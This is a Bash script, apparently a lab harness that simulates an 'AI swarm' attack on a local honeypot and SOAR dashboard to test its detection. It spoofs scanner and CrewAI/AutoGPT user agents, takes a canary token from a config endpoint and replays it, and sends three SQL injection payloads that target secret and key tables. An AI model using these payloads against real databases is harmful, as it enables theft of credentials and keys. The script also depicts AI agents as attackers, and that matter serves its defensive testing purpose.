#!/usr/bin/env bash
# Vertex Forensic Lab v1.3 - Asalto de enjambre desde Parrot (WSL2, modo NAT)
set -u

WIN_HOST_IP=$(ip route show default | awk '{ print $3; exit }')
MY_WSL_IP=$(hostname -I | awk '{ print $1 }')
TARGET_URL="${TARGET_URL:-http://${WIN_HOST_IP}:8000}"
CURL="curl -s --max-time 20"

echo "=================================================================="
echo " [*] ASALTO DE ENJAMBRE DESDE PARROT OS (WSL2)"
echo " [*] IP Atacante (Parrot WSL) : ${MY_WSL_IP}"
echo " [*] Objetivo (Windows)       : ${TARGET_URL}"
echo "=================================================================="

# Comprobacion previa de alcance (NO toca la trampa; sesion propia 'precheck')
if ! $CURL -o /dev/null -A "Vertex-Precheck/1.3" -H "X-Swarm-Node: precheck" "${TARGET_URL}/"; then
    echo " [!] No hay respuesta de ${TARGET_URL} (timeout o conexion rechazada)."
    echo "     Si ya aislaste esta IP con el SOAR, ESTE es el resultado esperado."
    exit 1
fi

# ------------------------------------------------------------------
# FASE 1: ESCANER CLASICO (LEGACY_SCANNER)
# ------------------------------------------------------------------
echo -e "\n[1/4] Rafaga de escaner estatico (Nikto)..."
for i in 1 2 3; do
    $CURL -o /dev/null -w "    -> Probe #$i | HTTP %{http_code} | Tiempo: %{time_total}s\n" \
        -A "Mozilla/5.0 (Nikto/2.1.6; ParrotSec-Audit)" \
        -H "X-Swarm-Node: parrot-legacy-scanner" \
        "${TARGET_URL}/api/v2/internal/vault?node_id=${i}"
done

# ------------------------------------------------------------------
# FASE 2: NODO SCOUT IA (ROBO DE CANARY TOKEN)
# ------------------------------------------------------------------
echo -e "\n[2/4] Nodo Scout IA (CrewAI-Recon-Scout/3.1)..."
SCOUT_RESP=$($CURL \
    -A "CrewAI-Recon-Scout/3.1 (Autonomous-Discovery)" \
    -H "X-Swarm-Node: parrot-scout-alpha" \
    "${TARGET_URL}/api/v1/system/config")

CANARY_TOKEN=$(echo "$SCOUT_RESP" | grep -oP '"debug_token_hint"\s*:\s*"\K[^"]+' || true)
if [ -z "$CANARY_TOKEN" ]; then
    echo "    [!] No se obtuvo Canary Token. Respuesta: $SCOUT_RESP"
    exit 1
fi
echo "    [+] Canary Token exfiltrado: ${CANARY_TOKEN:0:28}..."
echo "    [*] Transferencia lateral al Exploit Worker (1.8 s)..."
sleep 1.8

# ------------------------------------------------------------------
# FASE 3: EXPLOIT POLIMORFICO CON HANDOFF Y ALTA ENTROPIA
# ------------------------------------------------------------------
echo -e "\n[3/4] Exploit polimorfico (AutoGPT-Swarm-Exploit/4.0)..."
PAYLOADS=(
    "1'%20UNION%20ALL%20SELECT%20NULL,key_hash,pg_sleep(0)%20FROM%20vault_secrets--%20/*a9F3xZq8*/"
    "99'%20OR%201=1%20UNION%20SELECT%20id,encode(master_key,'base64')%20FROM%20system_keys--%20/*K7mP2wL9*/"
    "-1'%20UNION%20SELECT%20table_name,column_name%20FROM%20information_schema.columns--%20/*X4vB8nQ1*/"
)
for idx in "${!PAYLOADS[@]}"; do
    step=$((idx + 1))
    $CURL -o /dev/null -w "    -> Impacto #${step} | HTTP %{http_code} | Tiempo (incluye Tarpit): %{time_total}s\n" \
        -A "AutoGPT-Swarm-Exploit/4.0 (LangGraph-Worker)" \
        -H "X-Swarm-Node: parrot-exploit-omega" \
        -H "Authorization: Bearer ${CANARY_TOKEN}" \
        "${TARGET_URL}/api/v2/internal/vault?node_id=${PAYLOADS[$idx]}"
    sleep 1.4
done

# ------------------------------------------------------------------
# FASE 4: INTENTO DE TOMAR LA SUPERFICIE DE MANDO (debe dar 403)
# ------------------------------------------------------------------
echo -e "\n[4/4] Intento de abuso de la superficie SOAR desde la red WSL..."
$CURL -o /dev/null -w "    -> GET  /api/telemetry/state        | HTTP %{http_code} (esperado 403)\n" \
    -A "AutoGPT-Swarm-Exploit/4.0 (LangGraph-Worker)" \
    -H "X-Swarm-Node: parrot-exploit-omega" \
    "${TARGET_URL}/api/telemetry/state"
$CURL -o /dev/null -w "    -> POST /api/actions/firewall-block | HTTP %{http_code} (esperado 403)\n" \
    -A "AutoGPT-Swarm-Exploit/4.0 (LangGraph-Worker)" \
    -H "X-Swarm-Node: parrot-exploit-omega" \
    -H "Content-Type: application/json" \
    -d '{"ip_address":"1.1.1.1","session_fingerprint":"hijack"}' \
    "${TARGET_URL}/api/actions/firewall-block"

echo "=================================================================="
echo " [OK] ASALTO COMPLETADO. Revisa el Radar Tactico en http://localhost:4200"
echo "=================================================================="
